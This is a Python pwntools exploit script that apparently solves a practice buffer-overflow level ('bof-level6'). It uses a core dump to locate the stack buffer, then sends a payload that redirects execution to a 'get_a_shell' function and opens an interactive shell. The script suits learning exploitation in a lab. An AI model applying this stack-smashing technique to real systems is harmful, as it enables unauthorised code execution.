#!/usr/bin/env python
import os
from pwn import *

#define our process
p = process("./bof-level6")

e = ELF('bof-level6')
shellHex = e.symbols['get_a_shell']
print(hex(shellHex))
print(shellHex)

buff = "A" * 132

if os.path.exists("core"):
    c = Core("./core")

    buffer_address = c.stack.find(buff)
    print(hex(buffer_address))
    print(buffer_address)

    #build up buffer with address one address passed beginning and starting address of buffer at the end to replace esp
    buff = "A" * 8
    buff += p64(shellHex) # address of get a shell
    buff += "A" * 112
    buff += p64(buffer_address) # address of buffer

    print(p.recv())
    p.sendline(buff)

    p.interactive()
else:
    p.sendline(buff)
    print(p.recv())
